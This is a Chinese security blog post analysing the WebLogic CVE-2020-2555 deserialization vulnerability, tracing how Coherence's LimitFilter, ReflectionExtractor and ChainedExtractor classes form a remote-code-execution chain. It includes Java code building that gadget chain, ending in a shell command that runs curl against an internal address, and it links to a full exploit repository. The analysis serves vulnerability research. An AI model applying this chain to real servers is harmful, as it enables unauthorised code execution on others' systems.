> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [y4er.com](https://y4er.com/post/weblogic-cve-2020-2555/)

Weblogic 简直是个无底洞.

2020.03.06 早上4点，看到了清水川崎师傅推送了Weblogic CVE-2020-2555的通告，在推特上搜了一波，发现有详细的分析文章，遂有此文。

漏洞分析
----

个人研究，没钱买补丁，这里借用[Zero Day](https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server)的图。

![image](https://y4er.com/img/uploads/20200310118799.png)

补丁中将`LimitFilter`类的`toString()`方法中的`extract()`方法调用全部移除，而我们需要知道在[CommonsCollections5](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)中可以利用`BadAttributeValueExpException`来调用任意类的`toString()`方法。

接着来看下没打补丁之前`LimitFilter`类的`toString()`方法。

```
public String toString() {
    StringBuilder sb = new StringBuilder("LimitFilter: (");
    sb.append(this.m_filter).append(" [pageSize=").append(this.m_cPageSize).append(", pageNum=").append(this.m_nPage);
    if (this.m_comparator instanceof ValueExtractor) {
        ValueExtractor extractor = (ValueExtractor)this.m_comparator;
        sb.append(", top=").append(extractor.extract(this.m_oAnchorTop)).append(", bottom=").append(extractor.extract(this.m_oAnchorBottom));
    } else if (this.m_comparator != null) {
        sb.append(", comparator=").append(this.m_comparator);
    }

    sb.append("])");
    return sb.toString();
} 
```

`toString()`中会将`this.m_oAnchorTop`和`this.m_oAnchorBottom`作为参数传入`ValueExtractor.extract()`，补丁移除了`extractor.extract()`操作，跟进`extract()`看下，发现`extract()`只是一个抽象方法，并没有实现，那说明`extract()`在`ValueExtractor`的子类中可以利用。因为是反序列化，所以我们只需要在`ValueExtractor`子类中找到实现了`Serializable`或者`ExternalizableLite`反序列化接口并且有`extract()`的方法。最终在`com.tangosol.util.extractor.ReflectionExtractor#extract()`找到了反射任意方法调用。

```
public E extract(T oTarget) {
    if (oTarget == null) {
        return null;
    } else {
        Class clz = oTarget.getClass();

        try {
            Method method = this.m_methodPrev;
            if (method == null || method.getDeclaringClass() != clz) {
                this.m_methodPrev = method = ClassHelper.findMethod(clz, this.getMethodName(), ClassHelper.getClassArray(this.m_aoParam), false);
            }

            return method.invoke(oTarget, this.m_aoParam);
        } catch (NullPointerException var4) {
            throw new RuntimeException(this.suggestExtractFailureCause(clz));
        } catch (Exception var5) {
            throw ensureRuntimeException(var5, clz.getName() + this + '(' + oTarget + ')');
        }
    }
} 
```

到现在为止我们可以传入一个`Runtime.getRuntime()`的`oTarget`，将`this.m_methodPrev`赋值为exec，然后`this.m_aoParam`就是我们的命令参数，就可以RCE了。而对于反序列化而言，我们需要继续构建对象，让他自己执行`Runtime.getRuntime()`，这里很像cc链中的`InvokerTransformer.transform()`，那有没有像cc链中的`ChainedTransformer`类呢。遂找到了`com.tangosol.util.extractor.ChainedExtractor#extract()`

```
@JsonbCreator
public ChainedExtractor(@JsonbProperty("extractors") ValueExtractor[] aExtractor) {
    super(aExtractor);
    this.m_nTarget = this.computeTarget();
}
public E extract(Object oTarget) {
    ValueExtractor[] aExtractor = this.getExtractors();
    int i = 0;

    for(int c = aExtractor.length; i < c && oTarget != null; ++i) {
        oTarget = aExtractor[i].extract(oTarget);
    }

    return oTarget;
} 
```

和cc5的构造很像，我们一步一步构造下

```
// Runtime.class.getRuntime()
ReflectionExtractor extractor1 = new ReflectionExtractor(
    "getMethod",
    new Object[]{"getRuntime", new Class[0]}

);

// get invoke() to execute exec()
ReflectionExtractor extractor2 = new ReflectionExtractor(
    "invoke",
    new Object[]{null, new Object[0]}

);

// invoke("exec","calc")
ReflectionExtractor extractor3 = new ReflectionExtractor(
    "exec",
    new Object[]{new String[]{"/bin/bash", "-c", "curl http://172.16.1.1/success"}}
); 
```

首先先构造三个`ReflectionExtractor`对象来调用反射拿到我们想要的，然后把他放到`ReflectionExtractor`数组中，将数组通过构造函数赋值给`ChainedExtractor`。

```
ReflectionExtractor[] extractors = {
    extractor1,
    extractor2,
    extractor3,
};

ChainedExtractor chainedExtractor = new ChainedExtractor(extractors); 
```

那到目前为止，只要反序列化执行了`chainedExtractor.extract()`就可以造成rce。而前文所说，`toString()`中是执行了`extract()`的，所以我们将`chainedExtractor`通过反射赋值给`limitFilter`对象。然后通过`BadAttributeValueExpException`触发`limitFilter`对象的`toString()`，进而触发`extract()`一步一步调用`method.invoke()`，继而通过反射拿到`Runtime.getRuntime().exec("")`，达成RCE。

坑
-

1.  `coherence.jar`要使用和目标版本一致的，不然会有`serialVersionUID`不一致的问题。
2.  `BadAttributeValueExpException`对jdk的版本有要求。具体看[这里](https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70)

漏洞利用
----

[https://github.com/Y4er/CVE-2020-2555](https://github.com/Y4er/CVE-2020-2555)

![](https://y4er.com/img/uploads/20200310119395.gif)

参考
--

1.  [https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server](https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server)
2.  [https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR76](https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR76)
3.  [https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**